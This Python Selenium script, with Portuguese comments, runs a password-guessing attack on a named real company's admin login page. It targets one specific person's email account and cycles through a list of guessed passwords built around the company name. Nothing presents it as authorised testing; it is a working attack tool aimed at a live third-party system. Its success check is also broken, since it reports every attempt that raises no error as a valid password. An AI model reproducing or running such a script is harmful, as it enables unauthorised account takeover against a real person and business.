
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

# Configurações iniciais
driver = webdriver.Chrome()  # Certifique-se de que você tem o ChromeDriver configurado
url = "https://credpago.com/admin/login.php"
email_field_name = "usuario"  # Nome do campo de e-mail na página HTML
password_field_name = "senha"  # Nome do campo de senha na página HTML
login_button_text = "Entrar"  # Texto do botão de login na página HTML
login_email = "camila@phdimobiliaria.com.br"  # Endereço de e-mail para login

# Lista de senhas a serem testadas
passwords = [
    "credpago",
    "credpago123",
    "credpago2023",
    "credpagoseguro",
    "pagocred",
    "credito_pago",
    "credito_pago2023",
    "credpago1234",
    "credpago!@#",
    "pagocredito",
    "12345",
    # Adicione outras senhas aqui
]

# Função para fazer login com um e-mail e senha
def login_with_email_and_password(email, password):
    driver.get(url)
    # Esperar até que o campo de e-mail esteja visível
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, email_field_name)))
    email_field = driver.find_element_by_name(email_field_name)
    email_field.clear()
    email_field.send_keys(email)
    # Aguardar 1 segundo após a digitação do e-mail
    time.sleep(1)
    # Esperar até que o campo de senha esteja visível
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, password_field_name)))
    password_field = driver.find_element_by_name(password_field_name)
    password_field.clear()
    password_field.send_keys(password)
    # Aguardar 1 segundo após a digitação da senha
    time.sleep(1)
    login_button = driver.find_element_by_xpath(f"//button[text()='{login_button_text}']")
    login_button.click()

# Loop através das senhas
for password in passwords:
    try:
        login_with_email_and_password(login_email, password)
        # Verificar se a senha foi válida (você pode verificar a resposta da página aqui)
        # Se a página retornar um erro, você pode capturar a exceção aqui
        # Se a página de login redirecionar para outra página após o login bem-sucedido, verifique a URL atual.
        # Você pode ajustar essa lógica com base na resposta real da página de login.
        print(f"Senha '{password}' válida.")
    except Exception as e:
        # Se ocorrer uma exceção (por exemplo, senha inválida), continue testando as senhas.
        print(f"Senha '{password}' inválida.")

# Feche o navegador quando terminar
driver.quit()
